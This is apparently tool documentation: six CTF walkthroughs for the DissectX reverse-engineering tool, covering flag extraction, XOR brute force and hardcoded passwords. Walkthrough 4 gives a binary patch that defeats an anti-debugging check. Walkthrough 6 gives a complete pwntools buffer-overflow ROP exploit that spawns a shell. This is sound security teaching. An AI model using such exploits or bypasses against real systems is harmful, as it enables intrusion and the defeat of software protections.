# DissectX CTF Walkthrough Examples

## Table of Contents

1. [Introduction](#introduction)
2. [Walkthrough 1: Basic Flag Extraction](#walkthrough-1-basic-flag-extraction)
3. [Walkthrough 2: XOR Decryption Challenge](#walkthrough-2-xor-decryption-challenge)
4. [Walkthrough 3: String Context Analysis](#walkthrough-3-string-context-analysis)
5. [Walkthrough 4: Anti-Analysis Bypass](#walkthrough-4-anti-analysis-bypass)
6. [Walkthrough 5: Dynamic String Decryption](#walkthrough-5-dynamic-string-decryption)
7. [Walkthrough 6: ROP Chain Building](#walkthrough-6-rop-chain-building)
8. [Tips and Tricks](#tips-and-tricks)

---

## Introduction

This guide provides step-by-step walkthroughs of solving CTF challenges using DissectX. Each walkthrough demonstrates different features and techniques, from basic flag extraction to advanced dynamic analysis.

### Prerequisites

- DissectX installed and working
- Basic understanding of reverse engineering concepts
- Familiarity with command-line tools

### Challenge Difficulty Levels

- 🟢 **Easy**: Basic flag extraction, simple obfuscation
- 🟡 **Medium**: XOR encryption, string analysis, basic anti-analysis
- 🔴 **Hard**: Dynamic unpacking, complex anti-analysis, ROP chains

---

## Walkthrough 1: Basic Flag Extraction

**Difficulty**: 🟢 Easy  
**Skills**: String extraction, pattern matching  
**Challenge**: Find the hidden flag in a binary


### Scenario

You've downloaded a binary from a CTF competition. The challenge description says "The flag is hidden somewhere in the binary."

### Step 1: Initial Analysis

```bash
# Run DissectX on the binary
python main.py challenge1.exe
```

**Output**:
```
🔍 Binary file detected! Analyzing...

📊 Binary Analysis Report
========================

📝 Strings Found: 42
🚩 Potential Flags: 1

🎯 Detected Flags:
  [HIGH] CTF{str1ngs_4r3_n0t_s3cur3}
    Location: 0x2040
    Encoding: Plain text
```

### Step 2: Verify the Flag

The flag `CTF{str1ngs_4r3_n0t_s3cur3}` was found! Let's verify it's correct:

```bash
# Submit the flag
echo "CTF{str1ngs_4r3_n0t_s3cur3}" | ./submit.sh
```

**Result**: ✅ Flag accepted!

### What Happened?

DissectX automatically:
1. Detected the binary format (PE/ELF)
2. Extracted all printable strings
3. Matched strings against common flag patterns
4. Ranked results by confidence

### Key Takeaway

For simple challenges, DissectX can find flags instantly without manual analysis.

---


## Walkthrough 2: XOR Decryption Challenge

**Difficulty**: 🟡 Medium  
**Skills**: XOR analysis, entropy calculation  
**Challenge**: Decrypt XOR-encrypted flag

### Scenario

The binary contains an encrypted flag. The challenge hint says "Single-byte XOR encryption."

### Step 1: Initial Analysis

```bash
python main.py challenge2.exe
```

**Output**:
```
📊 Binary Analysis Report
========================

📝 Strings Found: 15
🚩 Potential Flags: 0

⚠️  No obvious flags found. Try advanced analysis.
```

No plain text flag found. Let's try XOR analysis.

### Step 2: XOR Brute Force

```bash
# Use XOR analyzer
python -m src.detectors.xor_analyzer challenge2.exe
```

**Output**:
```
🔐 XOR Analysis Results
======================

Testing all 256 single-byte keys...

Top Results (by entropy):
  Key: 0x42 | Entropy: 4.2 | Preview: CTF{x0r_1s_r3v3rs1bl3}
  Key: 0x13 | Entropy: 7.8 | Preview: ��������������
  Key: 0x7F | Entropy: 7.9 | Preview: ��������������
```

### Step 3: Extract the Flag

The key `0x42` produces readable text with low entropy!

```bash
# Decrypt with key 0x42
python -c "
data = open('challenge2.exe', 'rb').read()
key = 0x42
decrypted = bytes([b ^ key for b in data])
print(decrypted.decode('utf-8', errors='ignore'))
" | grep CTF
```

**Result**: `CTF{x0r_1s_r3v3rs1bl3}`

### What Happened?

DissectX:
1. Tried all 256 possible XOR keys
2. Calculated entropy for each result
3. Prioritized low-entropy (readable) results
4. Found the correct key automatically

### Key Takeaway

XOR brute-force is effective for single-byte keys. DissectX automates this process.

---


## Walkthrough 3: String Context Analysis

**Difficulty**: 🟡 Medium  
**Skills**: Function analysis, cross-references  
**Challenge**: Find the password validation function

### Scenario

A binary asks for a password. You need to find where the password is checked.

### Step 1: Extract Strings

```bash
python main.py challenge3.exe --full
```

**Output** (partial):
```
📝 Interesting Strings:
  "Enter password: "
  "Access granted!"
  "Access denied!"
  "sup3r_s3cr3t_p4ss"
```

### Step 2: Find String Usage

```bash
# Full analysis with function tracking
python main.py challenge3.exe --full --unlimited
```

Look for the string "sup3r_s3cr3t_p4ss" in the output:

```markdown
## String: "sup3r_s3cr3t_p4ss"
- Location: 0x3040
- Used in: check_password (0x1234)
- Usage pattern: strcmp
- Cross-references: 1
```

### Step 3: Analyze the Function

```bash
# Focus on specific function
python main.py challenge3.exe --full --function check_password
```

**Output**:
```assembly
check_password:
  push rbp
  mov rbp, rsp
  mov rdi, [rbp+8]        ; User input
  lea rsi, [0x3040]       ; "sup3r_s3cr3t_p4ss"
  call strcmp
  test eax, eax
  jz access_granted
  jmp access_denied
```

**Translation**:
```
Compare user input with "sup3r_s3cr3t_p4ss"
If equal, grant access
Otherwise, deny access
```

### Step 4: Submit the Password

```bash
echo "sup3r_s3cr3t_p4ss" | ./challenge3.exe
```

**Result**: `Access granted! Flag: CTF{str1ng_r3f3r3nc3s_r3v34l_4ll}`

### What Happened?

DissectX:
1. Extracted all strings from the binary
2. Tracked which functions use each string
3. Identified the password comparison function
4. Revealed the hardcoded password

### Key Takeaway

String context analysis reveals how data is used, making it easy to find validation logic.

---


## Walkthrough 4: Anti-Analysis Bypass

**Difficulty**: 🔴 Hard  
**Skills**: Anti-debugging detection, patching  
**Challenge**: Bypass anti-debugging checks

### Scenario

The binary detects debuggers and refuses to run. You need to bypass the protection.

### Step 1: Detect Anti-Analysis

```bash
python main.py challenge4.exe --advanced
```

**Output**:
```
🛡️  Anti-Analysis Techniques Detected
====================================

[HIGH] IsDebuggerPresent API call at 0x1100
  Description: Checks if debugger is attached
  Bypass: Patch return value or hook API

[MEDIUM] PEB BeingDebugged check at 0x1150
  Description: Checks PEB->BeingDebugged flag
  Bypass: Patch PEB or modify check

[HIGH] Timing check (rdtsc) at 0x1200
  Description: Measures execution time
  Bypass: Hook rdtsc or patch comparison
```

### Step 2: Identify Bypass Strategy

Let's patch the `IsDebuggerPresent` check:

```bash
# Disassemble the check
python main.py challenge4.exe --full --function main
```

**Output**:
```assembly
0x1100: call IsDebuggerPresent
0x1105: test eax, eax
0x1107: jnz debugger_detected
0x1109: ; Continue normal execution
```

### Step 3: Patch the Binary

We need to make the jump never taken. Change `jnz` to `jz` or `nop` the jump.

```python
# patch.py
with open('challenge4.exe', 'rb') as f:
    data = bytearray(f.read())

# Patch jnz (0x75) to jz (0x74) at offset 0x1107
data[0x1107] = 0x74

with open('challenge4_patched.exe', 'wb') as f:
    f.write(data)
```

### Step 4: Run Patched Binary

```bash
./challenge4_patched.exe
```

**Result**: `Flag: CTF{4nt1_d3bug_byp4ss3d}`

### Alternative: Use Emulation

```bash
# Emulate without triggering anti-debug
python main.py challenge4.exe --emulate
```

DissectX's emulator doesn't trigger anti-debugging checks!

### What Happened?

DissectX:
1. Detected anti-analysis techniques
2. Provided bypass recommendations
3. Identified exact locations of checks
4. Enabled safe emulation as alternative

### Key Takeaway

Understanding anti-analysis techniques is crucial. DissectX automates detection and suggests bypasses.

---


## Walkthrough 5: Dynamic String Decryption

**Difficulty**: 🔴 Hard  
**Skills**: Emulation, dynamic analysis  
**Challenge**: Decrypt strings at runtime

### Scenario

The binary encrypts strings and decrypts them at runtime. Static analysis shows gibberish.

### Step 1: Static Analysis

```bash
python main.py challenge5.exe
```

**Output**:
```
📝 Strings Found: 8
  "\x4a\x3f\x2e\x1d..."  (encrypted)
  "\x7f\x6e\x5d\x4c..."  (encrypted)
  
⚠️  Many strings appear encrypted
💡 Try: python main.py challenge5.exe --decrypt-strings
```

### Step 2: Dynamic String Decryption

```bash
python main.py challenge5.exe --decrypt-strings
```

**Output**:
```
🦄 Emulation-Based String Decryption
===================================

Emulating decryption functions...

Decrypted Strings:
  [HIGH] "CTF{dyn4m1c_4n4lys1s_w1ns}"
    Original: "\x4a\x3f\x2e\x1d..."
    Decryption function: 0x1500
    Method: XOR with computed key
    
  [MEDIUM] "Welcome to the challenge"
    Original: "\x7f\x6e\x5d\x4c..."
    Decryption function: 0x1500
    Method: XOR with computed key
```

### Step 3: Understand the Decryption

```bash
# Analyze the decryption function
python main.py challenge5.exe --full --function decrypt_string
```

**Pseudo-code**:
```c
char* decrypt_string(char* encrypted) {
    int key = compute_key();  // Dynamic key generation
    for (int i = 0; i < strlen(encrypted); i++) {
        encrypted[i] ^= key;
    }
    return encrypted;
}
```

### Step 4: Extract the Flag

The flag was automatically decrypted: `CTF{dyn4m1c_4n4lys1s_w1ns}`

### What Happened?

DissectX:
1. Detected encrypted strings (high entropy)
2. Identified decryption functions
3. Emulated the decryption process safely
4. Extracted decrypted strings

### Key Takeaway

Dynamic analysis with emulation reveals runtime behavior that static analysis misses.

---


## Walkthrough 6: ROP Chain Building

**Difficulty**: 🔴 Hard  
**Skills**: ROP gadgets, exploit development  
**Challenge**: Build a ROP chain to bypass NX

### Scenario

You need to exploit a buffer overflow, but NX (No Execute) is enabled. You must use ROP.

### Step 1: Find ROP Gadgets

```bash
python -m src.rop_analyzer challenge6.exe
```

**Output**:
```
🔗 ROP Gadget Analysis
=====================

Found 247 useful gadgets

Top Gadgets:
  0x401234: pop rdi; ret
  0x401567: pop rsi; pop r15; ret
  0x401890: pop rax; ret
  0x402345: syscall; ret
  0x403456: mov [rdi], rsi; ret
```

### Step 2: Plan the ROP Chain

Goal: Execute `execve("/bin/sh", NULL, NULL)`

Required gadgets:
1. `pop rdi; ret` - Set first argument (/bin/sh address)
2. `pop rsi; ret` - Set second argument (NULL)
3. `pop rax; ret` - Set syscall number (59 for execve)
4. `syscall; ret` - Execute syscall

### Step 3: Build the Chain

```python
# exploit.py
from pwn import *

# Addresses
pop_rdi = 0x401234
pop_rsi = 0x401567
pop_rax = 0x401890
syscall = 0x402345
bin_sh = 0x404000  # Address of "/bin/sh" string

# Build ROP chain
rop_chain = b''
rop_chain += p64(pop_rdi)
rop_chain += p64(bin_sh)      # rdi = "/bin/sh"
rop_chain += p64(pop_rsi)
rop_chain += p64(0)           # rsi = NULL
rop_chain += p64(0)           # r15 = 0 (pop r15 from gadget)
rop_chain += p64(pop_rax)
rop_chain += p64(59)          # rax = 59 (execve)
rop_chain += p64(syscall)     # Execute syscall

# Build exploit
payload = b'A' * 72           # Overflow to RIP
payload += rop_chain

# Send exploit
p = process('./challenge6.exe')
p.sendline(payload)
p.interactive()
```

### Step 4: Export for Pwntools

```bash
# Export gadgets in pwntools format
python -m src.rop_analyzer challenge6.exe --export pwntools > gadgets.py
```

**gadgets.py**:
```python
from pwn import *

class Gadgets:
    pop_rdi_ret = 0x401234
    pop_rsi_pop_r15_ret = 0x401567
    pop_rax_ret = 0x401890
    syscall_ret = 0x402345
    mov_rdi_rsi_ret = 0x403456
```

### Step 5: Test the Exploit

```bash
python exploit.py
```

**Result**: Shell spawned! 🎉

### What Happened?

DissectX:
1. Scanned binary for ROP gadgets
2. Identified useful gadgets (pop, syscall, etc.)
3. Scored gadgets by usefulness
4. Exported in pwntools-compatible format

### Key Takeaway

ROP gadget finding is tedious manually. DissectX automates discovery and provides exploit-ready output.

---


## Tips and Tricks

### General Tips

#### 1. Start Simple
Always start with basic analysis before advanced techniques:
```bash
# Step 1: Basic analysis
python main.py binary.exe

# Step 2: If needed, full analysis
python main.py binary.exe --full

# Step 3: If needed, advanced features
python main.py binary.exe --advanced --emulate
```

#### 2. Use the Right Tool for the Job

| Challenge Type | DissectX Feature |
|----------------|------------------|
| Hidden strings | Basic analysis |
| XOR encryption | `--decrypt-strings` or XOR analyzer |
| Password check | `--full` with string context |
| Anti-debugging | `--advanced` |
| Packed binary | `--generate-dump` |
| ROP challenge | ROP analyzer |

#### 3. Combine with Other Tools

DissectX works great with other tools:
```bash
# Use with objdump
objdump -d binary | python main.py

# Use with strings
strings binary.exe | grep -i flag

# Use with ltrace
ltrace ./binary 2>&1 | tee trace.log
```

### CTF-Specific Tips

#### Finding Flags Quickly

```bash
# Quick flag scan
python main.py binary.exe | grep -i "CTF{"

# Check for encoded flags
python main.py binary.exe | grep -E "[A-Za-z0-9+/]{20,}={0,2}"
```

#### Dealing with Obfuscation

```bash
# Try XOR with common keys
for key in 0x00 0x42 0xFF 0xAA 0x55; do
    echo "Trying key: $key"
    python -c "data=open('binary.exe','rb').read(); print(bytes([b^$key for b in data]))" | strings
done
```

#### Time-Saving Shortcuts

```bash
# Alias for quick analysis
alias dissect='python /path/to/dissectx/main.py'

# Quick flag extraction
dissect binary.exe | grep -i flag

# Full analysis to file
dissect binary.exe --full --output analysis.md
```

### Advanced Techniques

#### 1. Memory Dump Analysis

For packed binaries:
```bash
# Generate memory dump
python main.py --generate-dump packed.exe

# Analyze the dump
python main.py --memory-dump packed.exe.dmp
```

#### 2. Function-Specific Analysis

Focus on specific functions:
```bash
# Analyze main function only
python main.py binary.exe --full --function main

# Analyze multiple functions
for func in main check_password validate_input; do
    python main.py binary.exe --full --function $func > ${func}_analysis.md
done
```

#### 3. Automated Flag Extraction

Create a script for batch processing:
```bash
#!/bin/bash
# extract_flags.sh

for binary in challenges/*.exe; do
    echo "Analyzing: $binary"
    python main.py "$binary" | grep -i "CTF{" >> flags.txt
done
```

### Common Pitfalls

#### 1. Missing Dependencies

```bash
# Install all dependencies
pip install -r requirements.txt

# Verify installation
python -c "import capstone, unicorn; print('OK')"
```

#### 2. Architecture Mismatch

```bash
# Auto-detect might fail, specify manually
python main.py binary.exe --arch arm64
```

#### 3. Large Output

```bash
# Use --output to save to file
python main.py large_binary.exe --full --output analysis.md

# Or use --unlimited for complete output
python main.py large_binary.exe --full --unlimited --output complete.md
```

### Practice Challenges

Try these platforms with DissectX:

1. **picoCTF** (https://picoctf.org)
   - Great for beginners
   - Many reverse engineering challenges
   - Perfect for learning DissectX

2. **HackTheBox** (https://hackthebox.eu)
   - Intermediate to advanced
   - Real-world scenarios
   - Good for testing advanced features

3. **CrackMes.one** (https://crackmes.one)
   - Focused on reverse engineering
   - Various difficulty levels
   - Excellent for practice

### Resources

- **DissectX Documentation**: See README.md
- **Architecture Guide**: See ARCHITECTURE.md
- **Plugin Development**: See PLUGIN_DEVELOPMENT.md
- **CTF Resources**: https://ctftime.org

### Getting Help

If you're stuck:

1. Check the documentation
2. Try `--help` flag
3. Enable verbose output: `--advanced`
4. Ask in the community (GitHub Discussions)
5. Review example walkthroughs

---

## Conclusion

DissectX is a powerful tool for CTF challenges, from simple flag extraction to complex exploit development. Practice with these walkthroughs, experiment with different features, and you'll become proficient at solving reverse engineering challenges.

### Next Steps

1. Try the walkthroughs with real CTF challenges
2. Experiment with different DissectX features
3. Create your own analysis workflows
4. Share your techniques with the community

Happy hacking! 🚀
